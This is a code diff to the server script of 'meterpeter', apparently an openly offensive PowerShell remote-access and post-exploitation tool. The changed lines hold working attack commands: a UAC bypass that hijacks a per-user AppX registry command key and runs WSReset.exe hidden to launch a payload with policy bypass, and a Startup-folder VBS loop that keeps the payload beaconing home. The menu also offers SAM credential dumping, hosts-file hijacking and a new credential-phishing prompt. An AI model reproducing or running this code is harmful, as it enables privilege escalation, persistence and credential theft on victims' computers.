@@ -33,9 +33,6 @@
 
 ## Meterpeter Develop version
 $dev_Version = "2.10.3";
-## Display msgbox(s) in Powershell
-Add-Type -assemblyname System.Windows.Forms
-
 
 function Character_Obfuscation($String)
 {
@@ -859,6 +856,7 @@ While($Client.Connected)
       write-host "   DumpSAM   Dump SAM/SYSTEM Credentials     Client:Admin - Privileges Required";
       write-host "   Dnspoof   Hijack Entrys in hosts file     Client:Admin - Privileges Required";
       write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
+      write-host "   CredPhi   Promp User for valid creds      Client:Admin - Privileges Required";
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;      
@@ -886,7 +884,8 @@ While($Client.Connected)
           Write-Host "   Status   Remote Path           Execution" -ForeGroundColor green;
           Write-Host "   ------   -----------           ---------";
           Write-Host "   Created  `$env:tmp\WStore.vbs   $Input_Delay (sec)`n`n"; 
-          $msgbox = [System.Windows.Forms.MessageBox]::Show("Exit Server and put meterpeter in listenner mode.`nTo recive the elevated Connection back in $Input_Delay seconds", "meterpeter Privilege Escalation", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+          Write-Host "   [i] Exit|Start meterpeter.ps1 again (use same ip|port|obfuscation)" -ForeGroundColor yellow;
+          Write-Host "   [i] to recive the elevated Connection back in $Input_Delay seconds." -ForeGroundColor yellow;Start-Sleep -Seconds 5;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\WStore.vbs;echo 'WScript.sleep $Delay_Time' `>`> `$env:tmp\WStore.vbs;echo 'objShell.Run `"cmd /R powershell Start-Process -FilePath C:\Windows\System32\WSReset.exe -WindowStyle Hidden`", 0, True' `>`> `$env:tmp\WStore.vbs;`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;cmd.exe /R start %tmp%\WStore.vbs";
         }
         If($Escal_choise -eq "Delete" -or $Escal_choise -eq "del")
@@ -937,7 +936,7 @@ While($Client.Connected)
           Write-Host "   $payload_name.ps1  `$env:tmp\$payload_name.ps1";
           Write-Host "   $payload_name.vbs  `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
           Write-Host "   Persistence LogFile:  $logfile (Local Machine)" -ForeGroundColor yellow;
-          $msgbox = [System.Windows.Forms.MessageBox]::Show("On StartUp our Remote Client will beacon`nhome from: $Delay_Time to $Delay_Time seconds (infinite loop).", "meterpeter Persistence", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) 
+          Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (infinite loop)." -ForeGroundColor yellow;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
           #$Command = Variable_Obfuscation(Character_Obfuscation($Command));
           ## Writing persistence setting into beacon.log local file ..
